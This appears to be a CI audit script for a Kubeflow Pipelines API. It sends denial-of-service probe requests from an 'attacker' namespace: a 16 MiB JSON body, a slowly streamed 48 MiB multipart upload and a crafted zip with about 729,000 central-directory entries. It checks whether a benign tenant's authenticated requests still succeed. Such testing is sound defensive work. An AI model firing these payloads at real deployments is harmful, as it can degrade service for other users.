#!/usr/bin/env python3
"""Bounded, dummy-only API availability probe for the disposable CI cluster."""

import argparse
import http.client
import json
import struct
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

API_HOST = 'ml-pipeline.kubeflow.svc.cluster.local'
API_PORT = 8888
BENIGN_NAMESPACE = 'kubeflow-user-example-com'
ATTACK_NAMESPACE = 'kfp-audit-attacker'
TOKEN_PATH = '/var/run/secrets/kubernetes.io/serviceaccount/token'
BOUNDARY = 'kfp-audit-boundary'


def request_status(path, body, content_type):
    request = urllib.request.Request(
        f'http://{API_HOST}:{API_PORT}{path}',
        data=body,
        headers={'Content-Type': content_type},
        method='POST',
    )
    print(f'HTTP_SEND_START ms={time.time_ns() // 1_000_000}', flush=True)
    try:
        with urllib.request.urlopen(request, timeout=10) as response:
            return response.status, response.read(256)
    except urllib.error.HTTPError as error:
        return error.code, error.read(256)
    finally:
        print(f'HTTP_SEND_END ms={time.time_ns() // 1_000_000}', flush=True)


def report_request():
    # The HTTP annotation maps the body directly to the string workflow field.
    # A valid outer JSON string carries invalid workflow JSON to the handler.
    body = json.dumps('x' * (16 << 20)).encode('ascii')
    return request_status('/apis/v2/workflows', body, 'application/json')


def multipart_request(payload, filename):
    prefix = (
        f'--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="uploadfile"; filename="{filename}"\r\n'
        'Content-Type: application/octet-stream\r\n\r\n'
    ).encode('ascii')
    suffix = f'\r\n--{BOUNDARY}--\r\n'.encode('ascii')
    connection = http.client.HTTPConnection(API_HOST, API_PORT, timeout=10)
    print(f'HTTP_SEND_START ms={time.time_ns() // 1_000_000}', flush=True)
    try:
        connection.putrequest(
            'POST',
            f'/apis/v2/pipelines/upload?namespace={ATTACK_NAMESPACE}',
        )
        connection.putheader(
            'Content-Type', f'multipart/form-data; boundary={BOUNDARY}'
        )
        connection.putheader(
            'Content-Length', str(len(prefix) + len(payload) + len(suffix))
        )
        connection.endheaders()
        connection.send(prefix)
        for offset in range(0, len(payload), 1 << 20):
            connection.send(payload[offset : offset + (1 << 20)])
            # Keep the rejected upload in flight long enough to observe another
            # tenant's requests, without making more than one attack request.
            if filename == 'oversized.yaml':
                time.sleep(0.02)
        connection.send(suffix)
        response = connection.getresponse()
        return response.status, response.read(256)
    finally:
        print(f'HTTP_SEND_END ms={time.time_ns() // 1_000_000}', flush=True)
        connection.close()


def oversized_multipart_request():
    return multipart_request(b'A' * (48 << 20), 'oversized.yaml')


def zip_directory_fixture():
    # Maximum number of empty 46-byte central-directory entries under KFP's
    # 32 MiB file limit. Go's zip.NewReader accepts this for a name scan.
    entries = 729443
    directory_size = entries * 46
    result = bytearray(directory_size + 22)
    for offset in range(0, directory_size, 46):
        result[offset : offset + 4] = b'PK\x01\x02'
    result[directory_size : directory_size + 4] = b'PK\x05\x06'
    struct.pack_into(
        '<HHI',
        result,
        directory_size + 8,
        entries & 0xFFFF,
        entries & 0xFFFF,
        directory_size,
    )
    return result


def prepare_zip():
    with open('/scratch/entries.zip', 'wb') as fixture:
        fixture.write(zip_directory_fixture())
    print('ZIP_READY bytes=33554400', flush=True)


def zip_request():
    with open('/scratch/entries.zip', 'rb') as fixture:
        return multipart_request(fixture.read(), 'entries.zip')


def benign_request(token):
    query = urllib.parse.urlencode(
        {'namespace': BENIGN_NAMESPACE, 'page_size': 1}
    )
    request = urllib.request.Request(
        f'http://{API_HOST}:{API_PORT}/apis/v2/pipelines?{query}',
        headers={'Authorization': f'Bearer {token}'},
    )
    with urllib.request.urlopen(request, timeout=2) as response:
        response.read(1024)
        return response.status


def run_benign():
    with open(TOKEN_PATH, encoding='ascii') as token_file:
        token = token_file.read().strip()
    successes = 0
    baseline_streak = 0
    baseline_failures = 0
    post_ready_failures = 0
    ready = False
    max_latency_ms = 0
    deadline = time.monotonic() + 20
    while time.monotonic() < deadline:
        started = time.monotonic()
        request_started_ms = time.time_ns() // 1_000_000
        try:
            status = benign_request(token)
            if status != 200:
                raise RuntimeError(f'status={status}')
            successes += 1
            if not ready:
                baseline_streak += 1
            if baseline_streak == 5 and not ready:
                ready = True
                print(
                    'READY five authenticated ListPipelines requests succeeded',
                    flush=True,
                )
        except (OSError, RuntimeError, urllib.error.URLError) as error:
            print(f'BENIGN_FAILURE {type(error).__name__}', flush=True)
            if ready:
                post_ready_failures += 1
            else:
                baseline_streak = 0
                baseline_failures += 1
            if baseline_failures >= 2 or post_ready_failures >= 2:
                print(
                    f'RESULT baseline_failures={baseline_failures} post_ready_failures={post_ready_failures} successes={successes}',
                    flush=True,
                )
                return 1
        print(
            f'SAMPLE start_ms={request_started_ms} end_ms={time.time_ns() // 1_000_000}',
            flush=True,
        )
        max_latency_ms = max(
            max_latency_ms, int((time.monotonic() - started) * 1000)
        )
        time.sleep(0.1)
    print(
        f'RESULT baseline_failures={baseline_failures} post_ready_failures={post_ready_failures} successes={successes} max_latency_ms={max_latency_ms}',
        flush=True,
    )
    return 0 if ready else 1


def run_attack(case):
    attacks = {
        'report': report_request,
        'multipart': oversized_multipart_request,
        'zip': zip_request,
    }
    started = time.monotonic()
    try:
        status, body_prefix = attacks[case]()
        handler_marker = (
            b'Could not unmarshal workflow'
            if case == 'report'
            else b'File size too large'
            if case == 'multipart'
            else b'Failed to read a pipeline spec file'
        )
        if status >= 400 and handler_marker in body_prefix:
            outcome = 'handler_rejected'
        elif status in (401, 403, 413):
            outcome = 'upstream_boundary'
        else:
            outcome = 'inconclusive'
        # Bound the diagnostic so an unexpected 400 can be classified without
        # logging the large dummy request or a full server response.
        print(f'RESPONSE_PREFIX case={case} data={body_prefix[:256]!r}')
        print(
            f'ATTACK_RESULT case={case} status={status} outcome={outcome} elapsed_ms={int((time.monotonic() - started) * 1000)}'
        )
        return 0 if outcome != 'inconclusive' else 1
    except (OSError, urllib.error.URLError) as error:
        # A transport failure does not prove the handler ran. Fail CI as
        # inconclusive instead of presenting an untested case as green.
        print(
            f'ATTACK_RESULT case={case} transport_error={type(error).__name__}'
        )
        return 1


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        'mode', choices=('benign', 'report', 'multipart', 'zip', 'prepare-zip')
    )
    args = parser.parse_args()
    if args.mode == 'benign':
        return run_benign()
    if args.mode == 'prepare-zip':
        prepare_zip()
        return 0
    return run_attack(args.mode)


if __name__ == '__main__':
    sys.exit(main())
